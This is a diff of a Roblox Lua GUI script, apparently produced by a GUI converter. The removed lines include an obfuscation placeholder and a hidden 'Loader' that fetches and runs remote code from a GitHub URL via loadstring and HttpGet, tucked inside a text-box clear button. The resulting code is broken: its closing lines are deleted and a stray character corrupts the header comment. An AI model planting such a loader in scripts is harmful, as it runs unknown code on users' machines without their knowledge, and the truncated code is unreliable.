@@ -1,4 +1,4 @@
---[=[
+n  --[=[
  d888b  db    db d888888b      .d888b.      db      db    db  .d8b.  
 88' Y8b 88    88   `88'        VP  `8D      88      88    88 d8' `8b 
 88      88    88    88            odD'      88      88    88 88ooo88 
@@ -960,20 +960,4 @@ task.spawn(C_15);
 local function C_17()
 	local script = LMG2L["LocalScript_17"];
 	local clear = script.Parent    	
-	    local box = clear.Parent:WaitForChild("TextBox")    
-
--- [[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local D={... [کل کد obfuscate]...} end)(...)
-
-
--- ══════════════════════════════════════════════════════════════
--- [+] Loader
--- ══════════════════════════════════════════════════════════════
-
-task.spawn(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/sepehrali1/.decayy/refs/heads/main/Auto"))() end) end)
-	    clear.MouseButton1Click:Connect(function()    	
-	        box.Text = ""    	
-	    end)	
-end;
-task.spawn(C_17);
-
-return LMG2L["ScreenGui_1"], require;
+	    local box = clear.Parent:WaitForChild("TextBox")
